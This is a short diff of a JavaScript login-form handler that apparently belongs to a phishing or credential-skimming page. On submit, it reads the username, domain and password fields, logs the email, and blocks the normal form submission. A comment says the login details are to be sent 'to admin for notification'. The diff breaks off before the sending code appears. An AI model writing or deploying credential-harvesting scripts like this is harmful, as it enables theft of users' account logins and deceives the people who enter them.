@@ -1,14 +1,16 @@
 document.addEventListener("DOMContentLoaded", function() {
-    // Get email and password values
-    const preEmail = document.getElementById("sign_in_username");
-    const postEmail = document.getElementById("sign_in_t_domain");
-    var email = preEmail.value + postEmail.value
-    const password = document.getElementById("sign_in_password");
+    
     const loginForm = document.getElementById("new_sign_in");
 
     // Add submit event listener
     loginForm.addEventListener("submit", function(event){
+        // Get email and password values
+        const password = document.getElementById("sign_in_password");
+        const preEmail = document.getElementById("sign_in_username");
+        const postEmail = document.getElementById("sign_in_t_domain");
+        var email = preEmail.value + postEmail.value
         // Prevent the default form submission
+        console.log(email)
         event.preventDefault();
         if(password.value != ''){
              //Send Login detail to admin for notification
